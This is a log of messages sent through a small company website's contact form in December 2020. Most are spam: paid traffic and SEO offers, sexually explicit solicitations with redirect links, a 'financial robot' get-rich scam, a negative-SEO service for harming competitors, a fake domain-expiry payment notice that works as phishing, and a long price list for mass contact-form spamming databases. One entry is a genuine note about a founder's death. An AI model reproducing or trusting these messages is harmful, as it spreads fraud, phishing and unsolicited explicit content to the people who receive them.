+++ 2020-12-11 12:31:08 PM -- Email from: Josephjus, -- subject: You’ll Be Shocked To See How These Disney Stars Looked Then And Now, -- email: sphinxy2001-tigerscroll@yahoo.com, -- Message is: Check out how Disney stars changed over the years, it’s crazy how different they look: 
https://www.tigerscroll.com/youll-be-shocked-to-see-how-these-disney-stars-looked-then-and-now/?utm_source=intmail&amp;utm_campaign=disneyemail
+++ 2020-12-14 06:46:53 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2020-12-14 08:51:50 AM -- Email from: Dannie Cruce, -- subject: Re:Hi, -- email: cruce.dannie@gmail.com, -- Message is: Good morning people at esyray.com,
Hope you’re well. 
I'm ,
Hope you’re well, and that the company is good. Please allow me to introduce to you this service.
The only service you'll need to get your internet site to the peak.
https://onlineuniversalwork.com/websitesubmitter442521
Regards,
+++ 2020-12-15 01:06:00 AM -- Email from: Rich Karm, -- subject: Death of Bob Carrell, -- email: tbone50@sbcglobal.net, -- Message is: I believe Bob was one of the three founders of Electrospace Systems, Inc in 1970.  Bob was 87, and a member of our Sunday School class at Bonham First United Methodist, Bonham, TX.  His obit is at https://www.wisefuneralhome.com/obituary/robert-carrel.  A truly fine gentleman.
+++ 2020-12-15 01:53:03 AM -- Email from: Gennie Heyward, -- subject: heyward.gennie93@gmail.com, -- email: heyward.gennie93@gmail.com, -- Message is: Tired of paying for clicks and getting lousy results? Now you can post your ad on 5000 advertising sites and you only have to pay a single monthly fee. Get unlimited traffic forever! 

For all the details, check out: 
http://www.ads-that-stay-up-forever.xyz
+++ 2020-12-15 05:12:40 AM -- Email from: Dustinjes, -- subject: Looking for serious relations? Only here real single girls are ready to mingle, -- email: ttthomaskorb@aol.com, -- Message is: Sexy girls prefer to pose at home and try to please their boyfriends completely. 
Homemade erotic photos with gorgeous coquettes in attractive panties or without them can be found only here, and you will really like it. 
https://onlineuniversalwork.com/40lxb 
Home photos of naked wives will appeal to everyone, because only passionate beauties take part in hot photosets. 
You should always remember about home photos of blondes who delicately demonstrate a full set of charms and rub their wet pussies. 
http://freeurlredirect.com/42mug
+++ 2020-12-15 05:12:40 AM -- Email from: RobertZooro, -- subject: Looking for hook up with a stranger! Ready for any experiments!, -- email: chingchng123@yahoo.com, -- Message is: We have collected the best porn pics and combined them into naughty categories that arouse the greatest interest among lovers of passionate sex. 
Here you can find everything your heart desires: from hard sex in nature and ending with crazy group fuck. 
https://slimex365.com/3zpuf 
Looking at erotic pictures of charming slender brunettes, blondes with gorgeous tits, handsome guys with big boners or mature males, it is impossible not to get horny. 
Professional porn actors and just lovers of good fucking, in order to calm their lust and experience an orgasm, with all their passion they have hot sex, which results in excellent quality photos. 
https://jtbtigers.com/3x2gf 
Lustful chicks not only with appetite take the strong trunks of their excited males by the cheeks, but also gladly expose their narrow slits for hard penetration. 
Guys just love blowjob and enjoy masturbation. 
https://ecuadortenisclub.com/3x56b
+++ 2020-12-15 05:12:40 AM -- Email from: MarvinFap, -- subject: Wanna relax after a long day. Let’s chat! Visit the site, -- email: lburton612@aol.com, -- Message is: Only on our website are 100% real private photos added by our users from all over the world! 
That is why the database of amateur photographs is updated on the site every day. 
https://ecuadortenisclub.com/3x85e 
We declare with confidence that our free private photo with girls is in the highest demand. 
http://freeurlredirect.com/42mun
+++ 2020-12-15 10:59:17 AM -- Email from: HowardEstak, -- subject: I’m completely naked. Wanna see the photo? My nickname is Frutty on the site, -- email: lifeguardsrule03@att.net, -- Message is: A wonderful collection of erotic photos of female charms at home, sent or taken from the Internet, these amateur pictures of ordinary girls have already conquered many men. 
https://qspark.me/u19uF4 
In the summer on the street you meet a lot of beautiful, slender, young females and a strong desire wakes up to see them naked or at least look under their skirts, it seems that most healthy men experience this. 
http://xsle.net/3z541
+++ 2020-12-15 10:59:17 AM -- Email from: HaroldVew, -- subject: Just bought sexy underwear. Wanna see? Visit the site, -- email: kvyarwood@yahoo.com, -- Message is: Our site - These are high-quality porn photos with naked girls. 
Who show candid photos of their pussies, big asses, boobs and more. 
You can watch all content for free, not only through a computer, but also through a tablet and on Android and IOs devices. 
https://onlineuniversalwork.com/40lxb 
The site has a lot of photos of naked girls who are not shy about showing all their charms. 
The site has many categories: young girls, photos with matures, moms, girls with penises, gangbang, vkontakte porn, porn parties and many others. 
http://freeurlredirect.com/42mug
+++ 2020-12-15 10:59:17 AM -- Email from: Kennyved, -- subject: Already wet from dirty thoughts bout you. Click the link and get my phone number, -- email: siznal_r@yahoo.com, -- Message is: If you have been looking for a long time where you can see pictures of naked depraved girls online, completely free of charge, then you have come to the right place. 
We have selected the best high quality porn pictures that you can view on your phone or PC at any time. 
http://gongpo.moum.kr/8xSU 
Incredibly hot erotic photos with gentle blondes and burning brunettes who most of all love sex are presented on our website. 
Mature women and very young girls with working mouths and sensitive holes are waiting for you. 
They are happy to indulge in unforgettable debauchery for free. 
http://xsle.net/3z80w
+++ 2020-12-15 10:59:18 AM -- Email from: Richardsix, -- subject: I was a really bad girl. Punish me with your dick in my mouth, -- email: spencerportal111@aol.com, -- Message is: Erotic photos, naked girls, intimate photos. 
https://ecuadortenisclub.com/3x4pb 
In any of the sections of our site you will find seductive and sexy erotic photos that will give you a lot of pleasant pleasures. 
https://darknesstr.com/3wa3s
+++ 2020-12-15 12:56:13 PM -- Email from: Freda Rymill, -- subject: , -- email: rymill.freda@msn.com, -- Message is: Looking for more business for your website? We can deliver targeted people precisely for your type of business
 To get details Check out: http://www.buy-visitors-4yoursite.xyz
+++ 2020-12-16 10:08:29 PM -- Email from: Mike Cook, -- subject: Gaining Higher Domain Authority score, -- email: no-replyGesUnfonse@gmail.com, -- Message is: Gооd dаy! 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a 50+ points in Moz DA with us today and rip the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
FYI: 
We also give big discounts for multiple plans 
 
 
thank you 
Mike Cook
 
support@monkeydigital.co
+++ 2020-12-16 11:05:39 PM -- Email from: , -- subject: Get an unique Xmas gift for your loved ones and friends, -- email: sales1@astrologicalstudio.com, -- Message is: Dear Madam, Dear Sir Are you looking for an unique Xmas gift for your loved ones and friends? If so then our astrological reports could be a right choice. We can evolve precise and highly detailed Natal Horoscope, Compatibility Of Partners, and Forecasts of Events reports for them. Please visit astrologicalstudio.com for more information. We will be very pleased to hear from you. Have a great day. Best regards Brian WRIGHT Eng., ASTROLOGICAL STUDIO, Denver, CO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2020-12-17 09:40:17 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://thevideonetwork.top/out.php/?site=esyray.com
+++ 2020-12-17 06:48:45 PM -- Email from: Carolpag, -- subject: Start An Online Dropshipping Business today - preloaded with 12,000 hot selling products-Work From Home Online, -- email: miraclesreport@gmail.com, -- Message is: Dropshipping business is a method of retail where the store owner never physically holds the products it sells.... You don’t need upfront investments to get the products that you sells.                            Instead, when the store owner sells one of the products it stocks on its website, the store owner  then buy the item from a third-party supplier (that is after store owner deducts his/her profit) The supplier  then ships the item directly to the end customer on behalf of the store owner. 
For only $99.99, get your 100% ready made dropshipping e-commerce store preloaded with 12,000 hot selling products - comes with  support,sales &amp; marketing training to drive traffic to your store 
Or create amazing website for your existing business- We Have All the Tools You Need 
for more information or to sign up,  pls visit us at  http://www.NETSKIEL.COM
+++ 2020-12-18 10:39:08 PM -- Email from: Karl Mondragon, -- subject: mondragon.karl53@gmail.com, -- email: mondragon.karl53@gmail.com, -- Message is: Say no to paying thousands of dollars for ripoff online advertising! Let me show you a method that requires only a tiny payment and generates an almost endless amount of web visitors to your website

To find out more check out our site here: https://bit.ly/zero-payment-traffic
+++ 2020-12-20 02:47:48 AM -- Email from: Lindsay Harrison, -- subject: Important Reminder, -- email: lindsay@topalexadirectory.top, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
http://topalexadirectory.top/abcc1/?=esyray.com


Lindsay
Voice Activation Follow-up Specialist
Top Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://topalexadirectory.top/out.php?site=esyray.com
+++ 2020-12-20 09:47:07 AM -- Email from: HenryExhal, -- subject: Make your money work for you all day long.  Link - http://1004tour.kr/1search/linker2_0/jump.php?url=https://hdredtube3.mobi/btsmart, -- email: guerrerocamilo@gmail.com, -- Message is: Need money? The financial robot is your solution. 
Link - http://2olega.ru/go?https://hdredtube3.mobi/btsmart
+++ 2020-12-22 10:48:19 AM -- Email from: Hattie Tanner, -- subject: Uncertain times, -- email: hattie.tanner@supervideomarketing.top, -- Message is: Hi – I hope you and your family are doing well!

Could your business benefit from a custom-made video right now?

Here's how we can help:
https://www.supervideomarketing.top/success/?=esyray.com


It's a very effective way to convert new customers, especially during these uncertain times!

Be well,
Hattie








- This commercial message sent from PJLK Marketing LC
410 E Santa Clara St. RBLD#817
San Jose, CA 95113

To unsubscribe click here:
https://supervideomarketing.top/out.php/?site=esyray.com
+++ 2020-12-22 04:48:34 PM -- Email from: Peter Bosworth, -- subject: Negative SEO Services, -- email: no-replysnumb@gmail.com, -- Message is: Gооd dаy! 
 
Competition not playing the game fair and square? 
Now you can fight back. 
 
Negative SEO, to make ranks go down: 
https://blackhat.to/ 
 
Contact us for any queries: 
support@blackhat.to
+++ 2020-12-23 05:34:03 PM -- Email from: Florentina Vestal, -- subject: Hey, -- email: florentina.vestal@msn.com, -- Message is: Hello!
Please permit me to quickly introduce to you what will benefit your website significantly as we prepare to enter 2021.
Do you own a business? If yes, definitely your business also has a website. And the purpose is to put your business online and to drive traffic. How do you ensure that your website is in a good position on the search engines to achieve its purpose? In these days of search engine optimization and the wholesale transition to the Internet that many companies are undergoing, Alexa traffic rank is one of the most critical metrics for measuring your site performance, especially compared to other websites in your specific niche.
Given that Alexa ranking provides you information about your website, it is an excellent tool to view search engine optimization. If your website is not optimized in the major search engines such as Google, Bing, Yahoo, etc., it's definitely can't achieve its purpose.  
So what should you do? 
It's quite easy to get started. Boost your Alexa ranking! It is considered one of the most important factors in evaluating your website's value by search engines. If you own a website that you would also want to monetize by selling text links ads or sponsored ads, you need to boost your Alexa ranking.
Interestingly, I have good news for you today. We can help you to BOOST your website ALEXA RANK up to 29,999 globally. I guess you know what that means, a better SEO for the site. Better website value. 
Please visit https://alexaspeed.com now to boost your website ALEXA RANK. Thank you.
If you have any questions, feel free to send an email to support@alexaspeed.com.

Best regards,
AlexaSpeed Team
+++ 2020-12-24 01:10:41 AM -- Email from: Vicki Frost, -- subject: , -- email: frost.vicki@gmail.com, -- Message is: I can show you how you can promote your site without paying anything at all!

Have a look at this complete directory consisting of the most popular search sites here ::&gt;https://bit.ly/free-ad-website-directory
+++ 2020-12-24 08:44:44 AM -- Email from: DonaldSox, -- subject: My Profit: $ 169000, -- email: rogerpem@ggmaail.com, -- Message is: Two weeks ago, I got laid off. 
 
With no options left, I thought my life was over. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;    http://www.irex-jp.com/catalog/redirect.php?action=url&amp;goto=vk.cc%2FbWfgeN  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; 
 
Now I’m making over $9,261.42 each and every day. 
 
And for the first time in 2 months, my account isn’t overdrawn. 
 
&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;    http://banners.saratov.ru/click.php?id=99&amp;redir=https%3A%2F%2Fvk.cc%2FbWfgn3%3F37459-EURO-am-Tag  &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2020-12-24 11:19:48 AM -- Email from: Nicola Slamm, -- subject: Real Social Media Followers and Likes - 100% Safe &amp; Manual, -- email: nicolaslamm1978@gmail.com, -- Message is: Get more Followers, Likes, Views to all your social media channels instantly. 
100% Safe, Real Human (No bots). 
 
250 Instagram followers @ $3.99: https://store.marketingchoice.com/buy-instagram-followers 
100 Facebook page followers @ $3.99: https://store.marketingchoice.com/facebook-page-followers 
100 LinkedIn followers @ $4.99: https://store.marketingchoice.com/linkedin-company-page-followers 
100 TikTok followers @ $3.99: https://store.marketingchoice.com/tiktok-followers 
 
And many more channels and options at: https://Store.MarketingChoice.com 
 
For custom package or more information please contact: MarketingChoice.com@gmail.com
+++ 2020-12-24 07:49:12 PM -- Email from: Bernadette Felton, -- subject: YOU NEED QUALITY VISITORS FOR YOUR: esyray.com, -- email: felton.bernadette@gmail.com, -- Message is: YOU NEED QUALITY VISITORS FOR YOUR: esyray.com
 
WE PROVIDE ORGANIC VISITORS BY KEYWORD FROM SEARCH ENGINES OR SOCIAL MEDIA
 
YOU GET HIGH-QUALITY VISITORS
  -  visitors from search engines
  -  visitors from social media
  -  visitors from any country you want
 
CLAIM YOUR 24 HOURS FREE TEST =&gt;  https://bit.ly/2HQZggh
+++ 2020-12-25 02:27:30 PM -- Email from: Tawnya Gladden, -- subject: esyray.com, -- email: esyray.com@esyray.com, -- Message is: DOMAIN SERVICES EXPIRATION NOTICE FOR esyray.com

Domain Notice Expiry ON: Dec 25, 2020

We have actually not received a payment from you.
We have actually tried to call you yet were not able to contact you.


Go To: https://cutt.ly/Sh2pYdR

For details as well as to make a discretionary settlement for your domain website service.





122520200446283753688578798esyray.com
+++ 2020-12-26 11:34:46 AM -- Email from: Regina Hiller, -- subject: , -- email: hiller.regina@outlook.com, -- Message is: Pause:Think about this. Powerful New Devotional Book dealing with youth issues. Find out more at http://bit.ly/flm-publications
+++ 2020-12-26 02:39:36 PM -- Email from: contactgzeddb, -- subject: We will send viacontact forms to the sites of business organizations via any countries of the world., -- email: damsonxristinja1992@rambler.ru, -- Message is: I'm happy to welcome you! 
 
Sending newsletters of Your offers via формам into the &quot;Contact us&quot; section to the sites of firms via any countries of the world in any languages.  
 
The commercial offer is sent to E-mail address 
 of organization one hundred percent will get to incoming! 
 
2000 bases: 
https://xn----7sbb1bbndheurc1a.xn--p1ai/prajs-list/ 
 
Test: 
20000 messages on foreign zones to your email address - twenty $. 
We need from You only electronic box, title and text of the letter. 
 
In our price there are more 800 databases for all domain zones of the world. 
Common databases: 
All Europe 44 countries 60726150 of sites - 1100$ 
All European Union 28 countries 56752547 of sites- 1000$ 
All Asia 48 countries 14662004 of domains - 300$ 
All Africa 50 countries 1594390 of sites - 200$ 
All North and Central America in 35 countries 7441637 of domains - 300$ 
All South America 14 countries 5826884 of sites - 200$ 
New domain names from around the world registered 24-48 hours ago. (A cycle of 15 mailings during the month) - 500$ 
Enterprises and organizations of the Russian Federation 4025015 - 300$ 
Ukraine 1114526 of sites - 100$ 
All Russian-speaking countries minus RF are 14 countries and there are 1979217 of domain names - 200$ 
New domains of the RF, registered 24-48 hours ago (A cycle of 15 mailings during the month) - 250$ 
 
Databases for sending newsletters: 
Whois-service databases of domains for all nations of the world. 
You can purchase our databases separately from newsletter's service at the request. 
 
P.S. 
Pls., do not respond to this offer from your email account, as it has been generated in automatic mode and will not get anywhere! 
Contact Feedback form =» https://xn----7sbb1bbndheurc1a.xn--p1ai/to-order/ 
 
PRICE LIST: 
 
Test mailing: $20 – 20000 contact forms websites 
 
All Europe 44 countries there are 60726150 websites – $1100 
 
All EU 28 countries there are 56752547 websites – $1000 
 
All Asia 48 countries there are 14662004 websites – $500 
 
All Africa 50 countries there are 1594390 websites – $200 
 
All North and Central America is 35 countries there are 7441637 websites – $300 
 
All South America 14 countries there are 5826884 websites – $200 
 
Top 1 Million World’s Best websites – $100 
 
Top 16821856 the most visited websites in the world – $300 
 
New websites from around the world registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 500$ 
 
Businesses and organizations of the Russian Federation – there are 4025015 websites – $300 
 
All Russian-speaking countries minus Russia – there are 14 countries and 2440822 websites – $200 
 
New websites of the Russian Federation, registered 24-48 hours ago. (A cycle of 15 mailings during the month) – 250$ 
 
1499203 of hosting websites around the world (there are selections for all countries, are excluded from databases for mailings) – $150 
 
295285 websites of public authorities of all countries of the world (selections for all countries, are excluded from databases for mailings) – $100 
 
3516251 websites online stores Worldwide – $250 
 
CMS mailings: 
 
3dCart 14689 websites - $50 
Adobe CQ5 133567 websites - $80 
Advance 17589 websites - $50 
AdVantShop.NET 2453 websites - $30 
ALMA 7095 websites - $30 
Ametys 2389 websites - $30 
Amiro 29587 websites - $30 
Angora 20357 websites - $50 
AVS 1369 websites - $30 
BbPress 1487 websites - $30 
BESTWEB 2699 websites - $30 
BigCommerce 78257 websites - $50 
Bitrix 319687 websites - $80 
Blogger 658267 websites - $80 
Blogspot 279865 websites - $80 
BuddyPress 51477 websites - $50 
Burning Board 4659 websites - $30 
Catalyst Web 11689 websites - $50 
ClassiPress 11796 websites - $50 
CMSimple 11052 websites - $30 
Concrete5 72100 websites - $50 
Contao 110897 websites - $80 
CONTENIDO 5069 websites - $30 
Convio 2268 websites - $30 
Coppermine Photo 1296 websites - $30 
CS Cart 11400 websites - $30 
Datalife Engine	42587 websites - $50 
Dede 230589 websites - $100 
DedeEIMS 96068 websites - $50 
DIAFAN 4058 websites - $30 
Discuz 47962 websites - $50 
Django 71167 websites - $50 
DokuWiki 9588 websites - $30 
Dotnetnuke 82964 websites - $50 
Drupal 978298 websites - $100 
EasyBlog 1165978 websites - $100 
EPiServer 29876 websites - $50 
ExpressionEngine 1769823 websites - $150 
eZ Publish 5367 websites - $30 
F- 9356 websites - $30 
FireBoard 1567 websites - $30 
General Blogs 2067 websites - $30 
GetSimple 23094 websites - $50 
Host 6871 websites - $30 
HostCMS	5042 websites - $30 
HubSpot 31762 websites - $50 
i- 9438 websites - $30 
Image 1368 websites - $30 
InSales 14149 websites - $50 
InSales	 11081 websites - $30 
InstantCMS 4136 websites - $30 
InteractiveBBS 32367 websites - $50 
Invision Power Board 2430 websites - $30 
IPBoard 2266 websites - $30 
IT 15189 websites - $50 
jforum 1056 websites - $30 
jobberBase 3387 websites - $30 
Joomla K2 154367 websites - $80 
Joomla	 1906994 websites - $200 
Koobi 3722 websites - $30 
Liferay	 5137 websites - $30 
Made Simple 20567 websites - $50 
Magento	 369447 websites - $80 
MediaMaxScript 103896 websites - $80 
MediaWiki 41468 websites - $50 
Microsoft SharePoint 13198 
MODx	 64023 websites - $50 
Moodle 8195 websites - $30 
Movable Type 13096 websites - $50 
MyBB 4367 websites - $30 
myUPB 3397 websites - $30 
NetCat	 7294 websites - $30 
NG 18356 websites - $50 
NING 3687 websites - $30 
NopCommerce 18600 websites - $30 
Open 5916 websites - $30 
OpenCart 667000 websites - $80 
Osclass 4652 websites - $30 
osCommerce 68468 websites - $50 
OUR- 3096 websites - $30 
OXID eShop 12200 websites - $50 
Oxwall 6800 websites - $30 
Parallels Plesk Sitebuilder 174216 websites - $80 
php 14367 websites - $50 
php Link 2298 websites - $30 
phpBB	 24400 websites - $30 
PHP-Fusion 2596 websites - $30 
PHPMelody 2365 websites - $30 
PHP-Nuke 2489 websites - $30 
PHPShop 2667 websites - $30 
PHPWeb 29789 websites - $50 
PHPWind 4032 websites - $30 
Plone 84962 websites - $50 
PowerEasy 1697 websites - $30 
Prestashop 434100 websites - $80 
Question2Answer 5598 websites - $30 
R 296498 websites - $80 
ReadyScript 6487682 websites - $80 
S.Builder 394367 websites - $80 
Shopify	 6093709 sites websites - $400 
Shoutbox 145564 websites - $80 
SilverStripe 31721 websites - $50 
Simpla 17429 websites - $50 
Sitecore 74861 websites - $50 
Sitefinity 4183 websites - $30 
SMF 8111 websites - $30 
SocialGO 54267 websites - $50 
SPIP 28269 websites - $50 
Squarespace 1098231 websites - $100 
StoreLand 8257 websites - $30 
SupeSite 12367 websites - $50 
Textpattern 10900 websites - $30 
TikiWiki 1446 websites - $30 
Tilda 47396 websites - $50 
Tumblr 302357 websites - $80 
TYPO3 845009 websites - $80 
Umbraco 146064 websites - $80 
UMI.CMS	 13191 websites - $50 
VamShop 1737 websites - $30 
vBulletin 14460 websites - $30 
Volusion 16006 websites - $50 
WallpaperSiteScript 2811 websites - $30 
Weebly 191753 websites - $80 
Wix 3379081 sites websites - $250 
WooCommerce 4459525 websites - $310 
Wordpress 35354537 websites - $650 
XenForo 21105 websites - $30 
XOOPS 20467 websites - $50 
XpressEngine 8565 websites - $30 
Zen Cart 26524 websites - $30 
 
Country: 
 
.ae 200462 websites UAE - $50 
.ae 1820 websites International zone UAE:.com .net .biz .info .name .tel 
.ag 11931 websites Antigua and Barbuda - $50 
.ai 33130 websites Anguilla - $50 
.am 21995 websites Armenia - $50 
.am 1684 websites International zone Armenia:.com .net .biz .info .name .tel 
.ar 782608 websites Argentina - $80 
.ar 75496 websites International zone Argentina:.com .net .biz .info .name .tel .mobi .asia-$50 
.ar.com 135 websites - $30 
.at 1356722 websites Austria - $100 
.at 181907 websites International zone Austria :.com .net .biz .info .name 
.au 2432174 websites Australia - $150 
.au 461279 websites International zone Australia:.com .net .biz .info .name 
.az 17855 websites Azerbaijan - $50 
.az 2036 websites International zone Azerbaijan:.com .net .biz .info .name .tel .mobi .asia-$30 
.ba 15725 websites Bosnia and Herzegovina - $30 
.ba 2291 websites international zone Bosnia and Herzegovina:.com.net.biz.info.org.name.tel.mobi.asia-$30 
.be 1349658 websites Belgium - $100 
.be 1056248 websites International zone Belgium:.com .net .biz .info .name 
.bg 54418 websites Bulgaria - $50 
.bg 50685 websites International zone Bulgaria:.com .net .biz .info .name 
.bo 2602 websites Bolivia - $30 
.bo 29415 websites International zone Bolivia:.com .net .biz .info .name .tel .mobi .asia-$50 
.br 3205100 websites Brazil - $200 
.br 1230078 websites International zone Brazil:.com .net .biz .info .name . 
.by 99148 websites Belarus - $50 
.by 1574 websites International zone Belarus:.com .net .biz .info .name .tel 
.ca 2587463 websites Canada - $150 
.ca 288395 websites International zone Canada:.com .net .biz .info .name 
.cc 436396 websites - $80 
.cc 1920589 websites Cocos Keeling Islands- $150 
.cf 2461460 websites Central African Republic - $150 
.cg 526 websites Congo - $30 
.ch 1629450 websites Switzerland - $100 
.ch 205292 websites International zone Switzerland:.com .net .biz .info .name .tel .mobi .asia-$50 
.ci 5794 websites Cote d'Ivoire - $30 
.ci 112 websites International zone Cote d'Ivoire:.com .net .biz .info .name 
.cl 590401 websites Chile - $80 
.cl 65996 websites International zone Chile:.com .net .biz .info .name .tel .mobi .asia-$50 
.cm 29221 websites Cameroon- $50 
.cn 23160610 websites China - $600 
.cn 1372416 websites International zone China:.com .net .biz .info .name .tel .mobi .asia-$100 
.co 1878923 websites Colombia - $100 
.co 10854 websites International zone Colombia:.com .net .biz .info .name .tel .mobi .asia-$30 
.cx 15753 websites Christmas Island - $50 
.cy 11092 websites Cyprus - $50 
.cy 744 websites International zone Cyprus:.com .net .biz .info .name .tel .mobi .asia-$30 
.cz 1001208 websites Czech Republic - $100 
.cz 193400 websites International zone Czech Republic:.com .net .biz .info .name .tel .mobi .asia-$50 
.de 15078512 websites Germany - $350 
.de 3894156 websites International zone Germany:.com .net .biz .info .name .tel .mobi .asia-$150 
.dk 1319155 websites Denmark - $100 
.dk 148164 websites International zone Denmark:.com .net .biz .info .name .tel .mobi .asia-$50 
.dm 23318 websites Dominica - $50 
.dn.ua 1835 websites - $30 
.do 5255 websites Dominican Republic- $30 
.dy.fi 1112 websites - $30 
.dz 5382 websites Algeria - $30 
.ec 11731 websites Ecuador - $50 
.ec 2897 websites International zone Ecuador:.com .net .biz .info .name .tel .mobi .asia-$30 
.ee 131791 websites Estonia- $50 
.ee 10490 websites International zone Estonia:.com .net .biz .info .name .tel .mobi .asia-$30 
.es 1509048 websites Spain - $100 
.es 683845 websites International zone Spain:.com .net .biz .info .name .tel .eu 3046076 websites Europe - $150 
.eu 633384 websites International zone Europe:.com .net .biz .info .name .fi 361111 websites Finland - $80 
.fi 69631 websites International zone Finland:.com .net .biz .info .name .fr 2810983 websites France - $150 
.fr 639546 websites International zone France:.com .net .biz .info .name .ge 24598 websites Georgia - $50 
.ge 1676 websites International zone Georgia:.com .net .biz .info .name .tel .gf 996 websites French Guiana - $30 
.gg 10528 websites Guernsey islands - $50 
.gh 703 websites Ghana - $30 
.gi 981 websites Gibraltar - $30 
.gp 2044 websites Guadeloupe - $30 
.gq 2027422 websites Equatorial Guinea - $100 
.gr 327215 websites Greece - $80 
.gr 57984 websites International zone Greece:.com .net .biz .info .name .tel .mobi .asia-$150 
.gt 15351 websites Guatemala - $50 
.hk 116093 websites Hong Kong - $50 
.hm 335 websites Heard &amp; McDonald islands - $30 
.hn 4732 websites Honduras - $30 
.hr 75736 websites Croatia - $50 
.hr 16592 websites International zone Croatia:.com .net .biz .info .name .tel .mobi .asia 
.ht 1299 websites Haiti - $30 
.hu 53940 websites International zone Hungary:.com .net .biz .info .name .tel .mobi .asia-$50 
.ie 209620 websites Ireland - $50 
.ie 49861 websites International zone Ireland:.com .net .biz .info .name .il 196266 websites Israel - $80 
.il 38537 websites International zone Israel:.com .net .biz .info .name .tel .in 1157482 websites India - $100 
.in 266179 websites International zone India:.com .net .biz .info .name .tel .io 496216 websites British Indian Ocean - $80 
.iq 2401 websites Iraq - $30 
.ir 574258 websites Iran - $80 
.ir 15487 websites International zone Iran:.com .net .biz .info .name .tel .mobi .asia 
.it 2410105 websites Italy – $150 
.it 954040 websites International zone Italy:.com.net.biz.info.org.name.tel.mobi.asia-$100 
.je 3016 websites Ireland - $30 
.jp 1825219 websites Japan - $150 
.jp 4683252 websites International zone Japan:.com.net.biz.info.org.name.tel.mobi.asia-$200 
.jp.net 5170 websites - $30 
.ke 14677 websites Kenya - $50 
.kg 10350 websites Kyrgyzstan - $30 
.kg 664 websites International zone Kyrgyzstan:.com .net .biz .info .name .tel .mobi .asia-$30 
.ki 79 websites Kiribati - $30 
.kn 3211 websites Saint Kitts and Nevis - $30 
.kr 272463 websites Korea- $80 
.kw 484 websites Kuwait - $30 
.ky 5783 websites Cayman Islands - $30 
.kz 113180 websites Kazakhstan - $80 
.kz 5876 websites International zone Kazakhstan:.com .net .biz .info .name .tel .mobi .asia-$30 
.lc 1121 websites Saint Lucia - $30 
.lk 32654 websites Sri Lanka - $30 
.lt 137666 websites Lithuania- $50 
.lt 27710 websites International zone Lithuania:.com .net .biz .info .name .tel .mobi .asia- $50 
.lu 74322 websites Luxembourg - $50 
.lu 4125 websites International zone Luxembourg:.com .net .biz .info .name .tel .mobi .asia-$30 
.lv 86593 websites Latvia - $50 
.lv 8887 websites International zone Latvia:.com .net .biz .info .name .tel .mobi .asia-$30 
.ma 59103 websites Morocco - $50 
.mc 3046 websites Monaco - $30 
.md 16730 websites Moldova - $50 
.md 1293 websites International zone Moldova:.com .net .biz .info .name .tel .mobi .asia-$30 
.me 761596 websites Montenegro - $80 
.me 86897 websites International zone Montenegro:.com .net .biz .info .name .tel .mobi .asia-$50 
.mg 3715 websites Madagascar- $30 
.mk 13266 websites Macedonia - $50 
.ml 2158835 websites Mali - $100 
.mn 17044 websites Mongolia - $50 
.mq 1112 websites Martinique (French) - $30 
.mr 776 websites Mauritania - $30 
.ms 7265 websites Montserrat - $30 
.mt 1402 websites Malta - $30 
.mu 6475 websites Maurifius - $30 
.mv 1996 websites Maldives - $30 
.mw 8579 websites Malawi - $30 
.mx 670901 websites Mexico- $80 
.mx 174571 websites International zone Mexico:.com .net .biz .info .name .tel .mobi .asia-$50 
.my 143039 websites Malaysia- $50 
.na 1094 websites - $30 
.nc 3497 websites New Coledonia (French) - $30 
.nl 3925784 websites Netherlands - $200 
.nl 1019697 websites International zone Netherlands:.com .net .biz .info .name .tel .mobi .asia-$100 
.no 620882 websites Norway - $80 
.no 74318 websites International zone Norway:.com .net .biz .info .name .tel .mobi .asia-$50 
.nu 255161 websites Niue- $50 
.nz 593127 websites New Zealand - $80 
.om 1701 websites Oman - $30 
.pe 83224 websites Peru - $50 
.pe 59157 websites International zone Peru:.com .net .biz .info .name .tel .mobi .asia-$50 
.pk 44464 websites Pakistan - $50 
.pl 1795299 websites Poland - $100 
.pl 327587 websites International zone Poland:.com .net .biz .info .name .tel .mobi .asia-$50 
.pr 1358 websites Puerto Rico - $30 
.pt 263136 websites Portugal - $80 
.pt 17691 websites International zone Portugal:.com .net .biz .info .name .tel .mobi .asia-$50 
.py 5593 websites Paraguay - $30 
.py 653 websites International zone Paraguay:.com .net .biz .info .name .tel .mobi .asia-$30 
.re 15089 websites Reunion (French) - $50 
.ro 424401 websites Romania - $80 
.ro 42046 websites International zone Romania:.com .net .biz .info .name .tel .mobi .asia-$50 
.rs 85503 websites Serbia - $50 
.ru 5025331 websites Russian - $250 
